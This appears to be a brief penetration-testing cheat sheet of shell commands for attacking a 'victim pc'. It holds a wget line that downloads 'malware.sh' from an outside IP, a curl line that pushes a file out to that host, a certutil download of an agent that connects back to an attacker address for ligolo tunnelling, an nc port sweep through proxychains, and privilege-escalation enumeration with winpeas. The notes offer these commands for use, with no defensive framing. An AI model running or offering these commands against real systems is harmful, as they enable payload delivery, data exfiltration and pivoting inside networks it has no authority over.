
```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
```

to download on victim pc

```
wget http://184.174.34.252:8080/malware.sh
```

to push file from victim pc

```
curl -k filename.txt http://184.174.34.252:8080/
```


```
seq 1 65535 | xargs -P50 -I{} proxychains -q nc -z -v -w 1 10.4.159.63 {} 2>&1  | grep -v -iE 'refused|timed'

```

File transfer For windows from python3 server

```
certutil.exe -urlcache -split -f http://192.168.45.198:8000/agent.exe agent.exe
./winpeas.exe | tee -a winpeas.txt

.\agent.exe -connect 192.168.45.198:11601 -ignore-cert

```

after starting ligolo
```
sudo ip route add 10.10.110.0/24 dev ligolo
```


./winpeas.exe | tee -a winpeas.txt
